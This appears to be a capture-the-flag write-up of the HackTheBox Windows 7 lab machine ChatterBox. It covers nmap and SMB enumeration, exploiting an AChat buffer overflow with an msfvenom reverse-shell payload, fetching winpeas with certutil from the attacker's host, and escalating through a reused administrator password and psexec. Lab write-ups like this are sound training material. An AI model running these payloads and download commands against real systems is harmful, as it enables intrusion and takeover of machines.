---
title: "HackTheBox - ChatterBox"
author: Nasrallah
description: ""
date: 2023-03-19 00:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, windows, easy, bof, rce, smb]
img_path: /assets/img/hackthebox/machines/chatterbox
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---


## **Description**

Hello hackers, I hope you are doing well. We are doing [ChatterBox](https://app.hackthebox.com/machines/) from [HackTheBox](https://www.hackthebox.com).

## **Enumeration**

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.10.74                                               
Host is up (0.13s latency).                                                    
                                       
PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
9255/tcp open  mon?                
| fingerprint-strings: 
|   HTTPOptions, RTSPRequest:                                                                                                                                 
|     HTTP/1.1 200 OK                                                          
|     Connection: close
|_    Server: AChat                                                            
9256/tcp open  achat        AChat chat system
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi
?new-service :
SF-Port9255-TCP:V=7.93%I=7%D=3/15%Time=6411A789%P=x86_64-pc-linux-gnu%r(HT
SF:TPOptions,35,"HTTP/1\.1\x20200\x20OK\r\nConnection:\x20close\r\nServer:
SF:\x20AChat\r\n\r\n")%r(RTSPRequest,35,"HTTP/1\.1\x20200\x20OK\r\nConnect
SF:ion:\x20close\r\nServer:\x20AChat\r\n\r\n");
Service Info: Host: CHATTERBOX; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Chatterbox
|   NetBIOS computer name: CHATTERBOX\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-03-15T12:10:23-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 6h20m00s, deviation: 2h18m36s, median: 4h59m58s
| smb2-security-mode: 
|   210: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-03-15T16:10:21
|_  start_date: 2023-03-15T15:31:02
```

We have a windows 7 machine running SMb and a chat system called `AChat` on port 9256.

### SMB

Let's list shares of the smb server.

```terminal
$ sudo smbclient -L 10.10.10.74                                                                                                                    [6/36]
Enter WORKGROUP\root's password:                                               
Anonymous login successful                                                     
                                                                               
        Sharename       Type      Comment                                 
        ---------       ----      -------
SMB1 disabled -- no workgroup available    
```

We managed to login as anonymous but couldn't list shares.

### Searchsploit

Let's use `searchsploit` to see if there is any vulnerabilities in `AChat`

```terminal
$ searchsploit achat                              
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                              |  Path
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Achat 0.150 beta7 - Remote Buffer Overflow                                                                                  | windows/remote/36025.py
Achat 0.150 beta7 - Remote Buffer Overflow (Metasploit)                                                                     | windows/remote/36056.rb
MataChat - 'input.php' Multiple Cross-Site Scripting Vulnerabilities                                                        | php/webapps/32958.txt
Parachat 5.5 - Directory Traversal                                                                                          | php/webapps/24647.txt
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

We found a buffer overflow exploit.

## **Foothold**

Let's copy the exploit with `searchsploit -m windows/remote/36025.py`.

Before running the exploit, we need to change the payload to a one that sends us a reverse shell.

We generate the payload using `msfvenom`

```bash
msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.10.17.90 LPORT=9001 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
```

After replacing the old payload with the new one, we setup a listener and run the exploit.

![](1.png)

Great! We got a shell as `Alfred`.

## **Privilege Escalation**

After uploading a copy of winpeas to the target, i run it and managed to get the following result.

```bash
certutil -urlcache -f http://10.10.17.90/win.exe win.exe
```

![](2.png)

We got the password of `Alfred`

Let's see if we can list shares of the smb server this time as `Administrator` using the password we got.

![](4.png)

It worked, we listed the shares and even connected to the `C$` share.

Now let's get a shell using `psexec`.

![](3.png)

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).
